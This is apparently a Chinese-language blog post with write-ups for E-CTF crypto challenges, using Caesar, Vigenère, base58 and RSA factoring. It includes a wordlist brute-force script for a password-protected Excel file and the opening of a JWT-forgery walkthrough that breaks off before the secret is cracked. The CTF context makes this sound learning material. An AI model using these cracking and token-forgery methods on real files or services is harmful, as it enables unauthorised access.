<html>

<head>
    <meta charset="utf-8">
    
    <title>Hexo</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="/favicon/favicon.ico">
    
<link rel="stylesheet" href="/css/main.css">

    
<link rel="stylesheet" href="/css/tagplugins.css">

    
<link rel="stylesheet" href="/css/highlight.css">

    


    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml" />
    
<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div class="blog-header">
   <a id="menu-nav-icon"><img src="/image/menu.png"/></a>
   <div class="nav-container">
     <nav id="main-nav">
       
         <a class="main-nav-link" href="/">Home</a>
       
         <a class="main-nav-link" href="/archives">Archives</a>
       
     </nav>
   </div>
   <!--
   <div id="search-form-wrap">
     <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
   </div>
 -->
    <h1 class="blog-title">Hexo</h1>
    <p class="lead blog-description"></p>
</div>

  <div id='main-part'>
      
    <div class="main">
<div class="blog-post">
    <!-- Title -->
    
      <h1 class="blog-post-title">
        <a href="/2025/03/03/E-CTF-Writeup/"><E-CTF Writeup></a>
      </h1>
    
    <!-- Date and Author -->
    <p class="blog-post-meta">
        2025-03-03
        
    </p>

    

    <!-- Content -->
    <h1 id="E-CTF比赛-Write-Up"><a href="#E-CTF比赛-Write-Up" class="headerlink" title="E-CTF比赛 Write Up"></a>E-CTF比赛 Write Up</h1><p>[TOC]</p>
<h2 id="1-Cryptography（密码学）"><a href="#1-Cryptography（密码学）" class="headerlink" title="1. Cryptography（密码学）"></a>1. Cryptography（密码学）</h2><h3 id="ASCII-me-anything-but-not-the-flag"><a href="#ASCII-me-anything-but-not-the-flag" class="headerlink" title="ASCII me anything but not the flag"></a>ASCII me anything but not the flag</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250202225828882.png" alt="image-20250202225828882"></p>
<p>根据它的提示，我们先将这段内容用ASCII解码，得到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">108 100 111 109 123 85 99 49 122 95 106 53 95 79 111 51 95 88 52 116 95 48 109 95 51 111 88 121 90 107 97 106 48 105 125 10 10 69 98 111 98 32 102 112 32 118 108 114 111 32 104 98 118 44 32 100 108 108 97 32 105 114 122 104 32 58 32 72 66 86 72 66 86 10 10 87 101 108 108 32 100 111 110 101 44 32 98 117 116 32 110 111 119 32 100 111 32 121 111 117 32 107 110 111 119 32 97 98 111 117 116 32 116 104 101 32 103 117 121 32 119 104 111 32 103 111 116 32 115 116 97 98 98 101 100 32 50 51 32 116 105 109 101 115 32 63</span><br><span class="line"></span><br><span class="line">-&gt;</span><br><span class="line"></span><br><span class="line">ldom&#123;Uc1z_j5_Oo3_X4t_0m_3oXyZkaj0i&#125;</span><br><span class="line"></span><br><span class="line">Ebob fp vlro hbv, dlla irzh : HBVHBV</span><br><span class="line"></span><br><span class="line">Well done, but now do you know about the guy who got stabbed 23 times ?</span><br></pre></td></tr></table></figure>

<p>第三段的指的是凯撒大帝被刺杀的事件：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203124929054.png" alt="image-20250203124929054"></p>
<p>所以我们尝试遍历前两段的凯撒加密结果，但只有第二段可以得到有用信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Here is your key, good luck : KEYKEY</span><br></pre></td></tr></table></figure>

<p>可以得知密钥为：”HBVHBV“（我一开始以为密码就是KEYKEY）。由于第一段括号前的内容为4个字母，刚好对的上”ectf“，所以应该是单表或者多表替换加密。再因为密钥为重复的内容，不难猜测这应该是“Vigenere 维吉尼亚密码”。于是找个在线的解密网页（<a target="_blank" rel="noopener" href="https://planetcalc.com/2468/#google_vignette%EF%BC%89%E4%BE%BF%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%88%B0flag%EF%BC%9A">https://planetcalc.com/2468/#google_vignette）便可以得到flag：</a><br><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203125756246.png" alt="image-20250203125756246"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ectf&#123;th1s_i5_th3_w4y_0f_3ncrypti0n&#125;</span><br></pre></td></tr></table></figure>





<h3 id="OIIAIOIIIAI-😼"><a href="#OIIAIOIIIAI-😼" class="headerlink" title="OIIAIOIIIAI 😼"></a>OIIAIOIIIAI 😼</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250202225852177.png" alt="image-20250202225852177"></p>
<p>由于知道这次比赛的flag格式为ectf{}，所以不难发现这串字符的偶数位应该是flag的开头，也就是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ectf&#123;y0U_5p1N_M3</span><br></pre></td></tr></table></figure>

<p>而由于}在字符串开头，所以猜测基数位的倒序为flag的后半部分：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R1GhT_R0unD_B4bY&#125;</span><br></pre></td></tr></table></figure>

<p>拼在一起得到flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ectf&#123;y0U_5p1N_M3_R1GhT_R0unD_B4bY&#125;</span><br></pre></td></tr></table></figure>





<h3 id="Hashes-Binder"><a href="#Hashes-Binder" class="headerlink" title="Hashes Binder"></a>Hashes Binder</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250202225920609.png" alt="image-20250202225920609"></p>
<p>首先会下载得到3个文件：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203194946028.png" alt="image-20250203194946028"></p>
<p>由于这份Excel文件被设置了密码保护，所以我们尝试用这个wordlist里的内容来爆破它：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> msoffcrypto</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">encrypted_file = <span class="string">&quot;parts.xlsx&quot;</span> </span><br><span class="line">password_list = <span class="string">&quot;wordlist.txt&quot;</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(password_list, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    passwords = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines()]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> password <span class="keyword">in</span> passwords:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(encrypted_file, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            office_file = msoffcrypto.OfficeFile(file)</span><br><span class="line">            office_file.load_key(password=password)</span><br><span class="line">            </span><br><span class="line">            decrypted_file = io.BytesIO()</span><br><span class="line">            office_file.decrypt(decrypted_file)</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;成功破解密码: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"><span class="comment"># 成功破解密码: dolphin</span></span><br></pre></td></tr></table></figure>

<p>打开Excel文件后会看到3部分内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Part 1</span><br><span class="line">036074c2585230c1ad9e6b654a1671ac13ee856eb505f44346593e1748a6a52a</span><br><span class="line"></span><br><span class="line">Part 2</span><br><span class="line">2H8ZcpmQyRisn</span><br><span class="line"></span><br><span class="line">Part 3</span><br><span class="line">cHJlc2NyaXB0aW9u</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先注意到第2，3部分非常像base64编码内容，于是尝试解码，第三部分会成功解出来：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prescription</span><br></pre></td></tr></table></figure>

<p>第二部分则提示解码失败，所以我们尝试其他base解码，最后用base58成功解码得到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">digestive</span><br></pre></td></tr></table></figure>

<p>第一部分则非常像哈希加密的结果，所以我们用这个网站试一下能不能破解</p>
<p><a target="_blank" rel="noopener" href="https://hashes.com/en/decrypt/hash">https://hashes.com/en/decrypt/hash</a></p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203152026422.png" alt="image-20250203152026422"></p>
<p>提示破解成功，原文为spooky，并且使用的算法是Gost Hash。（spooky其实也在这个wordlist.txt里，所以理论上来说这一步也可以用爆破得到。）</p>
<p>于是用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dolphin_spooky_digestive_prescription</span><br></pre></td></tr></table></figure>

<p>成功解压.zip压缩包得到flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ECTF&#123;J0nH_tH3_Cr4ck3R_95234826&#125;</span><br></pre></td></tr></table></figure>





<h3 id="RSA-intro"><a href="#RSA-intro" class="headerlink" title="RSA intro"></a>RSA intro</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250202230145188.png" alt="image-20250202230145188"></p>
<p>这道题我们会得到以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">n = 1184757578872726401875541948122658312538049254193811194706693679652903378440466755792536161053191231432973156335040510349121778456628168943028766026325269453310699198719079556693102485413885649073042144349442001704335216057511775363148519784811675479570531670763418634378774880394019792620389776531074083392140830437849497447329664549296428813777546855940919082901504207170768426813757805483319503728328687467699567371168782338826298888423104758901089557046371665629255777197328691825066749074347103563098441361558833400318385188377678083115037778182654607468940072820501076215527837271902427707151244226579090790964814802124666768804586924537209470827885832840263287617652116022064863681106011820233657970964986092799261540575771674176693421056457946384672759579487892764356140012868139174882562700663398653410810939857286089056807943991134484292518274473171647231470366805379774254724269612848224383658855657086251162811678080812135302264683778545807214278668333366983221748107612374568726991332801566415332661851729896598399859186545014999769601615937310266497300349207439222706313193098254004197684614395013043216709335205659801602035088735521560206321305834999363607988482888525092210585343868702766655032190348593070756595867719633492847013620378010952424253098519859359544101947494405255181048550165119679168071637363387551385352023888031983210940358096667928019837327581681936262186049576626435407253113152851511562799379477905913074052917135254673527350886619693800827592241738185465519368503599267554966329609741719839452532720121891782656000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001</span><br><span class="line">e = 65537</span><br><span class="line">c = 393830705821083872264416484945379590743951209334251680140561629963083955435155434968501995173717065691853716117413549060471633713246813706134614822460487831949312719410922980049951577395596254279195364667821988767675462852220254638390252652391863031378262058213973374365653466528787640726441241664538814924465041415751207617994829099967542528845558372954608772395722055861369383117996161988362298650918468621344968162697585757444815069821774651095279049590140325395770490299618719676066106689396243767847620065054763147901166291755102218540290732819710294120101688593205036339603152228827861450774360237006971191234350634731104643779249017990427055169232234892324512234471025984131134122883594190002695857381320761826426970820621555957081409595866374650139218172798735536295519361258955868218458841069870611367807353745731928726480481254620623949030522228724677423429285228917983167742866068764059333196595815029550909470984427785123479796787934189869159245455191142352654087327876642690754428041545205764160668875253155015956045237338532248073834631989395905208181116526111301051883717335829373670674970007067708289628731972707477338551521585672558157829354894929466723788269911067380887281008564055766243843557738727000164255990684153972958815292767702154995098383096546576559199090417518282978657504210433584144451378874050676287588884988934683793378300065910040270282398699691108573435112129408980056605713259535036581461672565785674329469547540861581715756111296028940885214170609934085009608200810707122173370006290459841638659407675519141544675968270051746963709729460531469035621873301953785282870733516854080405064440750450304537433849449545664331761838457477121677018421695909336075840076436991397964264703526101810961378256559625011198775706699</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因为没有其他信息了，所以我们先用 <a target="_blank" rel="noopener" href="http://www.factordb.com/index.php">http://www.factordb.com/index.php</a> 试一下暴力分解n：<br><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203131647064.png" alt="image-20250203131647064"></p>
<p>成功得到n的其中一个因数为5054843。之后就只需要写一段代码解密就可以得到flag：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_decrypt</span>(<span class="params">n, e, c, p</span>):</span><br><span class="line">    q = n // p</span><br><span class="line">    phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = inverse(e, phi_n)</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(m).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">n = </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = </span><br><span class="line">p = <span class="number">5054843</span>  </span><br><span class="line">plaintext = rsa_decrypt(n, e, c, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密结果:&quot;</span>, plaintext)</span><br><span class="line"><span class="comment"># 解密结果: ectf&#123;b4sic_F4cT0rDb_rS4&#125;</span></span><br></pre></td></tr></table></figure>





<h3 id="Cracking-the-Vault"><a href="#Cracking-the-Vault" class="headerlink" title="Cracking the Vault"></a>Cracking the Vault</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250202230203405.png" alt="image-20250202230203405"></p>
<p>这道题我们会得到2份文件，一份是python的代码，关于加密算法的，另一份文件则是加密后的结果。</p>
<p>我们首先来看一下加密的具体过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encryption</span>(<span class="params">text</span>):</span><br><span class="line">    encrypted = []</span><br><span class="line">    random = secrets.SystemRandom()</span><br><span class="line"></span><br><span class="line">    padding_length = <span class="number">256</span> - <span class="built_in">len</span>(text) % <span class="number">256</span></span><br><span class="line">    raw_padding = [<span class="built_in">chr</span>(random.randint(<span class="number">32</span>, <span class="number">126</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(padding_length)]</span><br><span class="line"></span><br><span class="line">    scrambled_padding = [<span class="built_in">chr</span>((<span class="built_in">ord</span>(c) * <span class="number">3</span> + <span class="number">7</span>) % <span class="number">94</span> + <span class="number">32</span>) <span class="keyword">for</span> c <span class="keyword">in</span> raw_padding]</span><br><span class="line">    shifted_padding = scrambled_padding[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    padded_text = <span class="string">&#x27;&#x27;</span>.join(shifted_padding) + text</span><br><span class="line"></span><br><span class="line">    final_padded_text = <span class="string">&#x27;&#x27;</span>.join(</span><br><span class="line">        <span class="built_in">chr</span>((<span class="built_in">ord</span>(c) ^ <span class="number">42</span>) % <span class="number">94</span> + <span class="number">32</span>) <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">else</span> c</span><br><span class="line">        <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(padded_text)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    secret_key = <span class="built_in">str</span>(<span class="built_in">sum</span>(<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> text))</span><br><span class="line">    secret_key = secret_key[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    hashed_key = hashlib.sha256(secret_key.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    seed = <span class="built_in">int</span>(hashed_key[:<span class="number">16</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    random = secrets.SystemRandom(seed)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(text):</span><br><span class="line">        char_code = <span class="built_in">ord</span>(char)</span><br><span class="line">        shift = (i + <span class="number">1</span>) * <span class="number">3</span></span><br><span class="line">        transformed = (char_code + shift + <span class="number">67</span>) % <span class="number">256</span></span><br><span class="line">        encrypted.append(<span class="built_in">chr</span>(transformed))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(encrypted), seed</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;VaultKey.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    text = f.read()</span><br><span class="line"></span><br><span class="line">encrypted_text, seed = encryption(text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;VaultKey_encrypted.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(encrypted_text)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The file has been successfully encrypted!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们可以注意到这段代码里有很多多余的内容（指没有真正出现在加密过程中），真正跟加密算法相关的其实只有这一段</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(text):</span><br><span class="line">        char_code = <span class="built_in">ord</span>(char)</span><br><span class="line">        shift = (i + <span class="number">1</span>) * <span class="number">3</span></span><br><span class="line">        transformed = (char_code + shift + <span class="number">67</span>) % <span class="number">256</span></span><br><span class="line">        encrypted.append(<span class="built_in">chr</span>(transformed))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(encrypted), seed</span><br></pre></td></tr></table></figure>

<p>所以我们只需要逆向一下这个加密逻辑便可以得到flag：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decryption</span>(<span class="params">encrypted_text</span>):</span><br><span class="line">    decrypted_chars = []</span><br><span class="line">    <span class="keyword">for</span> i, enc_char <span class="keyword">in</span> <span class="built_in">enumerate</span>(encrypted_text):</span><br><span class="line">        enc_code = <span class="built_in">ord</span>(enc_char)</span><br><span class="line">        shift = <span class="number">3</span> * (i + <span class="number">1</span>) + <span class="number">67</span></span><br><span class="line">        orig_code = (enc_code - shift) % <span class="number">256</span></span><br><span class="line">        decrypted_chars.append(<span class="built_in">chr</span>(orig_code))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decrypted_chars)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;VaultKey_encrypted.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    encrypted_text = f.read()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decryption(encrypted_text))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Well done! I bet you&#x27;re great at math. Here&#x27;s your flag, buddy: ectf&#123;1t_W45_ju5T_4_m1nu5&#125;</span></span><br></pre></td></tr></table></figure>





<h3 id="Never-two-without-three"><a href="#Never-two-without-three" class="headerlink" title="Never two without three"></a>Never two without three</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250202230223555.png" alt="image-20250202230223555"></p>
<p>我们首先会得到这些内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AEBvoE14n2JjDEhaEO5eAGnEFGdXluF2FNJxC01jXNPQX3PVl3T5oOm4DQrVXFXJGDBxEudVC3E5Xuh0oFzY</span><br></pre></td></tr></table></figure>

<p>直接尝试base64解码会提示失败，所以根据它的提示我们先遍历它的所有凯撒加密然后再解码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_cipher_decrypt</span>(<span class="params">text, shift</span>):</span><br><span class="line">    decrypted_text = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> string.ascii_letters:</span><br><span class="line">            is_upper = char.isupper()</span><br><span class="line">            alphabet = string.ascii_uppercase <span class="keyword">if</span> is_upper <span class="keyword">else</span> string.ascii_lowercase</span><br><span class="line">            new_index = (alphabet.index(char) - shift) % <span class="number">26</span></span><br><span class="line">            decrypted_text += alphabet[new_index]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            decrypted_text += char</span><br><span class="line">    <span class="keyword">return</span> decrypted_text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_base64_decode</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decoded_data = base64.b64decode(text).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> decoded_data</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">cipher_text = <span class="string">&quot;AEBvoE14n2JjDEhaEO5eAGnEFGdXluF2FNJxC01jXNPQX3PVl3T5oOm4DQrVXFXJGDBxEudVC3E5Xuh0oFzY&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> shift <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    decrypted_text = caesar_cipher_decrypt(cipher_text, shift)</span><br><span class="line">    base64_decoded = try_base64_decode(decrypted_text)</span><br><span class="line">    <span class="keyword">if</span> base64_decoded:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Shift: <span class="subst">&#123;shift&#125;</span>, 解码: <span class="subst">&#123;base64_decoded&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Shift: 10, 解码: ADeyMxwfsMLjPNnAgTUkMnEvT6gKMs41F7qKoryxG8LhK5SYY4gRKKKu96LtyZN</span></span><br></pre></td></tr></table></figure>

<p>发现这是唯一可以成功解码出来的内容。我们再次尝试用base64解码这段内容会提示失败，所以还是转战其他的base编码，最后再次用base58成功解码得到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The flag is: ectf&#123;D0_u_l0v3_t4e_crypt0grap413&#125;</span><br></pre></td></tr></table></figure>





<h2 id="2-Web"><a href="#2-Web" class="headerlink" title="2. Web"></a>2. Web</h2><h3 id="Java-Weak-Token"><a href="#Java-Weak-Token" class="headerlink" title="Java Weak Token"></a>Java Weak Token</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203201915159.png" alt="image-20250203201915159"></p>
<p>先简单科普一下JWT：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204135903301.png" alt="image-20250204135903301"></p>
<p>JWT是一串base64编码，被用.分成3部分。第一部分是header，里面会写使用的算法以及typ（一般都是JWT）。第二部分是Payload，是JWT的核心内容，通常会纪录当前JWT所有者的身份信息。第三部分则是签名，会计算</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(base64UrlEncode(header) + &quot;.&quot; +base64UrlEncode(payload),密钥)</span><br></pre></td></tr></table></figure>

<p>以确保当前信息的完整性（integrity），真实性（authenticity）。</p>
<p>在这道题我们会首先在目标网站里得到我们的JWT（我们每次访问网站都会得到一个新的JWT）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJleHAiOjE3MzgzNTcwMDV9.0dmdQRyyCngN1JJTVoVVk5WYqz0I44yBvWHyUEMXTzM</span><br></pre></td></tr></table></figure>

<p>用 <a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a> 分析一下：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203211406069.png" alt="image-20250203211406069"></p>
<p>可以看到，Payload里有一个名为”username“的值当前被设置为“user”，我们猜测只需要将其改成“admin”并且用其再次访问网站即可获得flag。</p>
<p>根据题目的提示，我们先将这个JWT的密钥给爆破出来：</p>
